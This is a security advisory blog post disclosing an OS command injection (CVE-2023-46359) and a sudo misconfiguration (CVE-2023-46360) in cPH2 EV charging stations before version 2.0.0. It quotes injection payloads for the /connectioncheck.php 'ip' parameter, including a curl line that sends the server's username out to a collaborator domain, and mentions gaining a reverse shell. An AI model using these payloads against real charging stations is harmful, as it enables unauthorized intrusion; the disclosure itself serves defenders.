

[![logo](/static/img/2022/offensity-logo.a280f1ac3bd0.svg)](/en/ "offensity.com/en/")
![close](/static/img/2022/mobile-close-icon.4e1cdcd5d2cd.svg)
[Solution](/en/solution/)
[Pricing](/en/pricing/)
[Demo](/en/demo/)

[DE](/de/)
[EN](/en/)

[Offensity Login ↗](https://reporting.offensity.com)
[Get it free](/en/signup/)

[DE](/de/)
[EN](/en/)
[Offensity Login ↗](https://reporting.offensity.com)
[Try for free](/en/try-offensity-for-free/)

![burger-menu](/static/img/2022/mobile-burger-menu.0fe3faa0a176.svg)

# OS Command Injection in cPH2 Charging Station <2.0.0 (CVE-2023-46359 and CVE-2023-46360)

**Ewen Coppens, Dec. 14, 2023**

During a web application penetration test for one of our clients we identified an OS Command Injection in the **cPH2** charging station produced by eCharge Hardy Barth GmbH.

The cPH2 charging station comes with a web interface where an administrator can monitor and manage real time usage, charge logs, firmware update as well as configuration settings.

![](https://sos-at-vie-1.exo.io/offensity-www-media/images/config_interface.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&X-Amz-Date=20250111T172855Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=6f1ab855e04a64ae8648beee02f9eed90ad830d8ed6528936531265da36e5e12)

Configuration Page

The vulnerable PHP page is not visible in the user interface, but an inspection of the page source unveiled the existence of the "**/connectioncheck.php**" endpoint, which takes an **IP** address as a parameter. Initially designed to assess connectivity to the provided IP, likely through a ping command, this endpoint may be susceptible to **OS Command Injection**.

![](https://sos-at-vie-1.exo.io/offensity-www-media/images/vulnerable_endpoint_in_source_code.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&X-Amz-Date=20250111T172855Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=c91ada7b2afb4dd7b04827d51531e80cf6825f0127ea5bea7e9e7cdda50d0e4a)

Vulnerable endpoint discovered in the page source of /config.php

Using a straightforward payload such as *ip=127.0.0.1 && ${whoami}*, the server responds with *127.0.0.1 && ${whoami} => <b>SUCCESS</b>*. This indicates that the command injection has been successfully executed. However, it is evident that the server is not displaying the output or result of the executed command.

In order to verify that the paylaod is executed and to extract data, we tried an out-of-band payload *127.0.0.1 && curl $(whoami).puna2r96oxpuhbuhki9vvrinkeq5ex2m.examplecollab.com* and we received DNS and HTTP request to our burp collaborator for the domain *www-data.puna2r96oxpuhbuhki9vvrinkeq5ex2m.examplecollab.com.*

![](https://sos-at-vie-1.exo.io/offensity-www-media/images/dns_request_out_of_band.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&X-Amz-Date=20250111T172855Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=5aa198b8490b36e7ae35c21eaef37d33eadc3f4f23cea0913ba5ca238fc47b8b)

DNS request received for the domain www-data.puna2r96oxpuhbuhki9vvrinkeq5ex2m.examplecollab.com.

Having confirmed the successful execution of the payload on the target device, we can now deploy a payload to initiate a reverse shell. This specific OS Command Injection vulnerability is formally identified as **CVE-2023-46359**.

![](https://sos-at-vie-1.exo.io/offensity-www-media/images/reverse-shell.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&X-Amz-Date=20250111T172855Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=2ec449721fe992ac047b1881abb5a2491368d93a3507909d6f51ad310815b0a9)

Reverse shell obtained as www-data

As we can see on the screenshot above, the service is currently running under the user context of *www-data*, and it has been discovered that this user possesses unnecessary privileges, specifically the ability to execute sudo commands without requiring a password. This configuration could pose a security risk, as an attacker with access to the *www-data* context may exploit these elevated privileges for unauthorized actions on the system. This vulnerability is referenced by as **CVE-2023-46360.**

A nuclei template for the **CVE-2023-46359** can be found on the [nuclei-templates repository](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-46359.yaml).

Both vulnerabilities affect any cPH2 Charging Station version < 2.0.0.
 The affected customers are advised to update their system to [the version 2.0.0 or later](http://salia.echarge.de/firmware/)

This website uses cookies and other technology to customize advertising
and provide you a more personalized experience. To find out more,
see our [Privacy Policy](/en/privacy/).

Unless you explicitly allow tracking, your data will not be collected using Google Analytics.

Allow tracking
Do not track

[![](/static/img/2022/offensity-logo-white.2ee1a7096670.svg)](/)
Product
[Offensity](/login)

Resources
[Blog](/en/blog/)
[FAQ](/en/faq/)

About
[A1 Digital](https://a1.digital/)
[About Us](/en/team)

Germany
St. Martin Straße 59
81669 Munich
Germany

Austria
Lassallestraße 9
1020 Vienna
Austria

[Contact](/en/contact/)
[Privacy Policy](/en/privacy/)
[Imprint](/en/imprint/)

